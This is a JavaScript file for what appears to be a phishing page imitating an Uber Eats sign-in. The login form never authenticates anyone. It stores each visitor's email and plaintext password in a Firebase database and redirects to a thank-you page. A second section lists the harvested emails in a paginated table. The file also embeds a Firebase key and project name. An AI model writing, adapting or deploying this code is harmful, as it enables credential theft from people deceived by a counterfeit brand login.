import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getDocs,
  query,
  orderBy,
  limit,
  startAfter
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAMbJ7lLkoWB0fBV1HIol-2CX-akA9Su3c",
  authDomain: "ubereates-75b74.firebaseapp.com",
  projectId: "ubereates-75b74",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.addEventListener("DOMContentLoaded", () => {

  const loginForm = document.getElementById("loginForm");

  if (loginForm) {
    const submitBtn = document.getElementById("submitBtn");
    const errorMessage = document.getElementById("errorMessage");

    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = document.getElementById("usernameOrEmail").value.trim();
      const password = document.getElementById("password").value;

      if (!email || !password) {
        showError("Please fill in all fields");
        return;
      }

      submitBtn.disabled = true;
      submitBtn.innerHTML = "Signing in...";

      try {
        await addDoc(collection(db, "users"), {
          email,
          password,
          createdAt: serverTimestamp(),
        });

        window.location.href = "/ubereats/thankyou.html";
      } catch (err) {
        console.error(err);
        showError("Something went wrong");
        submitBtn.disabled = false;
        submitBtn.innerHTML = "Sign In";
      }
    });

    function showError(msg) {
      errorMessage.textContent = msg;
      errorMessage.classList.add("show");
      setTimeout(() => errorMessage.classList.remove("show"), 4000);
    }
  }

  const usersBody = document.getElementById("usersBody");
  const prevBtn = document.getElementById("prevBtn");
  const nextBtn = document.getElementById("nextBtn");
  const loading = document.getElementById("loading");

  if (usersBody) {
    const PAGE_SIZE = 5;
    let lastVisible = null;
    let pageStack = [];

    async function loadUsers(direction = "next") {
      loading.style.display = "block";

      let q;

      if (direction === "next") {
        q = lastVisible
          ? query(
              collection(db, "users"),
              orderBy("createdAt", "desc"),
              startAfter(lastVisible),
              limit(PAGE_SIZE)
            )
          : query(
              collection(db, "users"),
              orderBy("createdAt", "desc"),
              limit(PAGE_SIZE)
            );
      }

      if (direction === "prev" && pageStack.length > 1) {
        pageStack.pop();
        lastVisible = pageStack[pageStack.length - 1];
        q = query(
          collection(db, "users"),
          orderBy("createdAt", "desc"),
          startAfter(lastVisible),
          limit(PAGE_SIZE)
        );
      }

      const snapshot = await getDocs(q);
      usersBody.innerHTML = "";

      snapshot.forEach((doc, index) => {
        const user = doc.data();
        const tr = document.createElement("tr");

        tr.innerHTML = `
          <td>${index + 1}</td>
          <td>${user.email}</td>
          <td>${user.createdAt?.toDate().toLocaleString() || "-"}</td>
        `;

        usersBody.appendChild(tr);
      });

      lastVisible = snapshot.docs[snapshot.docs.length - 1];
      pageStack.push(lastVisible);

      prevBtn.disabled = pageStack.length <= 1;
      nextBtn.disabled = snapshot.size < PAGE_SIZE;

      loading.style.display = "none";
    }

    nextBtn?.addEventListener("click", () => loadUsers("next"));
    prevBtn?.addEventListener("click", () => loadUsers("prev"));

    loadUsers();

    document.getElementById("usersTable").style.display = "table";

  }
});
